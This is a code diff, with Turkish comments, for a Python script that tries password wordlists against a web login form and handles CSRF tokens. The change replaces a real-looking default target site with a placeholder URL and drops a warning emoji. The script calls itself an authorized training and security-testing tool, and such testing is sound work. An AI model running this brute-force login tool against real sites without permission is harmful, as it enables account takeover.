@@ -57,7 +57,7 @@ def try_once(session: requests.Session, url: str, username: str, password: str,
     csrf = get_csrf(r1.text, csrf_name) if csrf_name else None
     if csrf_name and not csrf:
         if verbose:
-            print("⚠ CSRF token bulunamadı (form alanı adı doğru mu?).")
+            print("CSRF token bulunamadı (form alanı adı doğru mu?).")
        
    
     data = {
@@ -79,7 +79,7 @@ def try_once(session: requests.Session, url: str, username: str, password: str,
 
 def main():
     ap = argparse.ArgumentParser(description="Yetkili ortamda wordlist ile login denemesi (eğitim/güvenlik testi).")
-    ap.add_argument("--url", required=False, default="https://mc4fun.net/login/", help="Login formu URL")
+    ap.add_argument("--url", required=False, default="https://site123.com/login/", help="Login formu URL")
     ap.add_argument("--user", required=True, help="Kullanıcı adı")
     ap.add_argument("-P", "--passwords", required=True, help="Wordlist dosyası")
     ap.add_argument("--csrf-name", default="csrf_token", help="CSRF input name (varsayılan: csrf_token)")
